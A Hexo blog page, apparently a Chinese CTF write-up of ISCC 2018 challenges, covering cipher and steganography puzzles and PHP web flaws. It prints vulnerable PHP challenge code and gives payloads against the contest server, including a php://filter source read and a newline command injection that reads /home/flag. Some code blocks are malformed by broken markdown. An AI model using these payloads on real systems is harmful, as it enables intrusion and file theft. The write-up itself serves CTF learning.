@@ -1,0 +1,986 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="John Doe">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="John Doe">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content>
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>iscc_writeup · lethal&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/bitbug_favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >lethal&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">iscc_writeup</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>lethal's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            iscc_writeup
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">1.8k</span>Reading time: <span class="post-count reading-time">9 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/05/30</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="What-is-that？"><a href="#What-is-that？" class="headerlink" title="What is that？"></a>What is that？</h2><p><img src="https://i.loli.net/2018/05/10/5af3e28c69642.png" alt="1.PNG"></p>
+<ul>
+<li>直觉告诉我手指下有flag<br><img src="https://i.loli.net/2018/05/10/5af3e31c9df50.png" alt="2.PNG"></li>
+<li>分别对应长和宽，将宽度改成和长度一样<br><img src="https://i.loli.net/2018/05/10/5af3e3b163d5e.png" alt="WhatIsThat.png"></li>
+</ul>
+<h2 id="秘密电报"><a href="#秘密电报" class="headerlink" title="秘密电报"></a>秘密电报</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">秘密电报：</span><br><span class="line">知识就是力量 </span><br><span class="line">ABAAA</span><br><span class="line">ABABB</span><br><span class="line">ABAAA</span><br><span class="line">ABABA</span><br><span class="line">AABAA</span><br><span class="line">ABAAA</span><br><span class="line">BAABA</span><br><span class="line">AAABA</span><br><span class="line">AAABA</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>培根密码</li>
+</ul>
+<h2 id="重重谍影"><a href="#重重谍影" class="headerlink" title="重重谍影"></a>重重谍影</h2><p><img src="https://i.loli.net/2018/05/10/5af3e44d870c3.png" alt="44.PNG"></p>
+<ul>
+<li>一直base64解密，直达<br><img src="https://i.loli.net/2018/05/10/5af3e6cb782e3.png" alt="33.PNG"></li>
+<li>这里是真的坑，猜了很多密码，最后竟然是没有密码AES<br><img src="https://i.loli.net/2018/05/10/5af3e7b79480d.png" alt="5.PNG"></li>
+<li>根据题目用与佛论禅密码解密<br><img src="https://i.loli.net/2018/05/10/5af3e82628662.png" alt="55.PNG"></li>
+<li>这就是flag？？？嘤嘤嘤</li>
+</ul>
+<h2 id="有趣的ISCC"><a href="#有趣的ISCC" class="headerlink" title="有趣的ISCC"></a>有趣的ISCC</h2><ul>
+<li>用winhex打开<br><img src="https://i.loli.net/2018/05/10/5af408e54bdde.png" alt="3.PNG"></li>
+<li>Unicode解码两次</li>
+</ul>
+<h2 id="Where-is-the-FLAG？"><a href="#Where-is-the-FLAG？" class="headerlink" title="Where is the FLAG？"></a>Where is the FLAG？</h2><ul>
+<li>在图片片中看到Adobe Fireworks CS5字样，用该软件打开，发现按照顺序拼好就得到一个二维码，扫码即可<br><img src="https://i.loli.net/2018/05/10/5af4497c53f1d.png" alt="222.png"></li>
+</ul>
+<h2 id="凯撒十三世"><a href="#凯撒十三世" class="headerlink" title="凯撒十三世"></a>凯撒十三世</h2><ul>
+<li>凯撒十三世在学会使用键盘后，向你扔了一串字符：“ebdgc697g95w3”，猜猜它吧。</li>
+<li>先rot13解密得到<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- 查看键盘发现右下一位对应,```flagyougotme</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="一只猫的心思"><a href="#一只猫的心思" class="headerlink" title="一只猫的心思"></a>一只猫的心思</h2><ul>
+<li>用winhex打开，搜索<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">![6.PNG](https://i.loli.net/2018/05/10/5af44be3d0727.png)</span><br><span class="line">- 与佛论禅加密</span><br><span class="line">![66.PNG](https://i.loli.net/2018/05/10/5af44c5d6657f.png)</span><br><span class="line">-得到16进制</span><br><span class="line">```python</span><br><span class="line">import base64</span><br><span class="line">a=&quot;523156615245644E536C564856544E565130354B553064524D6C524E546B4A56535655795645644F5530524857544A4553553943566B644A4D6C524E546C7052523155795645744F536C5248515670555330354452456456576B524854554A585231457956554E4F51305A4855544E4553303153566B64424D6C524A546B7058527A525A5245744F576C5A4854544A5554553554513063304E46524C54564A5652316B795255744F51305A4856544E5554564661566B6C464D6B5252546B70595231557A5245394E516C5A4856544A555355354B566B644E5756524E5455705752316B7A5255564F55305248566B465553564A4356306C4E4D6C524E546B4A565231557952453152556C564A56544A455555354B5530644E5756525054554A56523030795645314F516C5A4857544A4553303143566B64464D305648546B744352314A425645744F576C5A4855544A4651303543566B64564D6B524854554A555230557A52454E4F536C644855544A5554553543566B645A4D6B564A546C4E445231566152456C52576C5A4855544A5553303544516B64564D6C524C54564A55523045795245314F556C4A4856544E455355354B56556C564D6B564E546B70535230315A52457452536C564951544A555455354B565564535156524A54564A575230457956456C4E576C46485454525553303143566B6446576C564A54544A46&quot;</span><br><span class="line">def hex2str(a):</span><br><span class="line">	b=&quot;&quot;</span><br><span class="line">	for i in range(0,len(a)/2):</span><br><span class="line">		b+=chr(int(a[i*2:i*2+2],16))</span><br><span class="line">	print b</span><br><span class="line">	return b</span><br><span class="line">c=hex2str(a)</span><br><span class="line">d=base64.b64decode(c)</span><br><span class="line">print d</span><br><span class="line">e=base64.b32decode(d)</span><br><span class="line">print e</span><br><span class="line">f=hex2str(e)</span><br><span class="line">g=base64.b64decode(f)</span><br><span class="line">print g</span><br><span class="line">h=base64.b32decode(g)</span><br><span class="line">print h</span><br><span class="line">hex2str(h)</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="暴力XX不可取"><a href="#暴力XX不可取" class="headerlink" title="暴力XX不可取"></a>暴力XX不可取</h2><ul>
+<li>zip伪加密</li>
+</ul>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="比较数字大小"><a href="#比较数字大小" class="headerlink" title="比较数字大小"></a>比较数字大小</h2><ul>
+<li>修改html提交限制条件</li>
+</ul>
+<h2 id="web01"><a href="#web01" class="headerlink" title="web01"></a>web01</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="string">'2.php'</span>); </span><br><span class="line">$flag=<span class="string">'&#123;***************&#125;'</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;   </span><br><span class="line">    <span class="keyword">if</span> (strcmp($_GET[<span class="string">'password'</span>], $flag) == <span class="number">0</span>)   </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);   </span><br><span class="line">    <span class="keyword">else</span>   </span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Invalid password'</span>;   </span><br><span class="line">&#125;   </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>php黑魔法，<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 本地的诱惑</span><br><span class="line">```html</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;gb2312&quot; /&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line"></span><br><span class="line">必须从本地访问！    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;utf-8&quot; /&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">//print_r($_SERVER);</span><br><span class="line">$arr=explode(&apos;,&apos;,$_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]);</span><br><span class="line">if($arr[0]==&apos;127.0.0.1&apos;)&#123;</span><br><span class="line">    //key</span><br><span class="line">    echo &quot;key is ISCC&#123;^&amp;*(UIHKJjkadshf&#125;&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	echo &quot;必须从本地访问！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="你能跨过去吗？"><a href="#你能跨过去吗？" class="headerlink" title="你能跨过去吗？"></a>你能跨过去吗？</h2><ul>
+<li>urldecode()然后utf-7decode()</li>
+<li>提交key得到flag</li>
+</ul>
+<h2 id="一切都是套路"><a href="#一切都是套路" class="headerlink" title="一切都是套路"></a>一切都是套路</h2><ul>
+<li><p>根据题目猜想源码泄露，<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">```php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&quot;REQUEST_METHOD&quot;] != &quot;POST&quot;)</span><br><span class="line">	die(&quot;flag is here&quot;);</span><br><span class="line"></span><br><span class="line">if (!isset($_POST[&quot;flag&quot;]) )</span><br><span class="line">	die($_403);</span><br><span class="line"></span><br><span class="line">foreach ($_GET as $k =&gt; $v)&#123;</span><br><span class="line">	$$k = $$v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach ($_POST as $k =&gt; $v)&#123;</span><br><span class="line">	$$k = $v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ( $_POST[&quot;flag&quot;] !== $flag )</span><br><span class="line">	die($_403);</span><br><span class="line"></span><br><span class="line">echo &quot;flag: &quot;. $flag . &quot;\n&quot;;</span><br><span class="line">die($_200);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+</li>
+<li><p>变量覆盖，<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">![666.png](https://i.loli.net/2018/05/10/5af45af625f0c.png)</span><br><span class="line"></span><br><span class="line">## 你能绕过吗?</span><br><span class="line">- payload:```http://118.190.152.202:8008/index.php?f=Php://filter/read=convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure></p>
+</li>
+<li><p>行吧，竟然是文件包含，禁了php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;导航页&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;a href=<span class="string">'index.php?f=articles&amp;id=1'</span>&gt;ID: <span class="number">1</span>&lt;/href&gt;</span><br><span class="line">    &lt;/br&gt;</span><br><span class="line">    &lt;a href=<span class="string">'index.php?f=articles&amp;id=2'</span>&gt;ID: <span class="number">2</span>&lt;/href&gt;</span><br><span class="line">    &lt;/br&gt;</span><br><span class="line">    &lt;a href=<span class="string">'index.php?f=articles&amp;id=3'</span>&gt;ID: <span class="number">3</span>&lt;/href&gt;</span><br><span class="line">    &lt;/br&gt;</span><br><span class="line">    &lt;a href=<span class="string">'index.php?f=articles&amp;id=4'</span>&gt;ID: <span class="number">4</span>&lt;/href&gt;</span><br><span class="line">    &lt;/br&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">#ISCC&#123;LFIOOOOOOOOOOOOOO&#125;</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'f'</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($_GET[<span class="string">'f'</span>],<span class="string">"php"</span>) !== <span class="keyword">False</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"error..."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">include</span>($_GET[<span class="string">'f'</span>] . <span class="string">'.php'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="web02"><a href="#web02" class="headerlink" title="web02"></a>web02</h2><ul>
+<li>第一次遇见，修改<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 请ping我的ip 看你能Ping通吗？</span><br><span class="line">- 命令注入,%0a</span><br><span class="line">- payload:```http://118.190.152.202:8018/?ip=127.0.0.1 %0a cat /home/flag</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="Please-give-me-username-and-password"><a href="#Please-give-me-username-and-password" class="headerlink" title="Please give me username and password!"></a>Please give me username and password!</h2><ul>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">```php</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag = &quot;***********&quot;;	</span><br><span class="line">if(isset($_GET[&apos;username&apos;]))&#123;</span><br><span class="line">	if (0 == strcasecmp($flag,$_GET[&apos;username&apos;]))&#123;</span><br><span class="line">	$a = fla;</span><br><span class="line">	echo &quot;very good!Username is right&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">	print &apos;Username is not right&lt;!--index.php.txt--&gt;&apos;;&#125;</span><br><span class="line">&#125;else</span><br><span class="line">print &apos;Please give me username or password!&apos;;</span><br><span class="line">if (isset($_GET[&apos;password&apos;]))&#123;</span><br><span class="line">	if (is_numeric($_GET[&apos;password&apos;]))&#123;</span><br><span class="line">		if (strlen($_GET[&apos;password&apos;]) &lt; 4)&#123;</span><br><span class="line">			if ($_GET[&apos;password&apos;] &gt; 999)&#123;</span><br><span class="line">			$b = g;</span><br><span class="line">			print &apos;&lt;p&gt;very good!Password is right&lt;/p&gt;&apos;;</span><br><span class="line">		&#125;else </span><br><span class="line">			print &apos;&lt;p&gt;Password too little&lt;/p&gt;&apos;;</span><br><span class="line">		&#125;else</span><br><span class="line">		print &apos;&lt;p&gt;Password too long&lt;/p&gt;&apos;;</span><br><span class="line">	&#125;else</span><br><span class="line">	print &apos;&lt;p&gt;Password is not numeric&lt;/p&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">if ($a.$b == &quot;flag&quot;)</span><br><span class="line">	print $flag;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
